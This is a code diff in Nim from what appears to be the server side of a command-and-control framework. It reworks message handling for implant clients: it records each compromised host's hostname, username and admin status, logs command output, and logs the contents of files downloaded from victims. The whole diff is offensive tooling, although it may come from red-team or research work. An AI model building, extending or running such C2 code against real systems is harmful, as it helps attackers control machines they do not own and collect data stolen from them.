@@ -12,24 +12,35 @@ proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: C2Client) {
       cDisconnected(client)  
       return
       
-    let task = parseJson(decode(line))
+    let response = parseJson(decode(line))
+    echo response
+    let error = response["error"].getStr() 
+    let taskId = response["taskId"].getInt() 
 
-    case task["task"].getStr():
-    of "connect":
+    if taskId > -1:
+      let task = server.tasks[taskId]
+      task.markAsCompleted(response)
+      if error != "":
+        errorLog $client & ": " & error
+      else: 
+        case response["task"].getStr():
+          of "identify":
+            server.clients[client.id].loaded = true
+            server.clients[client.id].hostname = response["data"]["hostname"].getStr()
+            server.clients[client.id].username = response["data"]["username"].getStr()
+            server.clients[client.id].isAdmin = response["data"]["isAdmin"].getBool()
+          of "output":
+            let output = response["data"]["output"].getStr()
+            let category = response["data"]["category"].getStr()
+            if output != "":
+              logClientOutput client, category, output
+          of "file":
+              infoLog "received file " & response["data"]["path"].getStr() & " from " & $client
+              logClientOutput client, "DOWNLOAD", response["data"]["contents"].getStr()
+    else:
       await client.askToIdentify()
-    of "identify":
-      server.clients[client.id].loaded = true
-      server.clients[client.id].hostname = task["hostname"].getStr()
-      server.clients[client.id].username = task["username"].getStr()
-      server.clients[client.id].isAdmin = task["isAdmin"].getBool()
-    of "output":
-      logClientOutput client, task["category"].getStr(), task["output"].getStr()
-      await client.completeResponse()
-    of "file":
-      infoLog "received file " & task["path"].getStr() & " from " & $client
-      logClientOutput client, "DOWNLOAD", task["contents"].getStr()
-      await client.completeResponse()
-
+          
+        
 proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.async.} =
   let id = len(server.tcpListeners)
   server.tcpListeners.add(
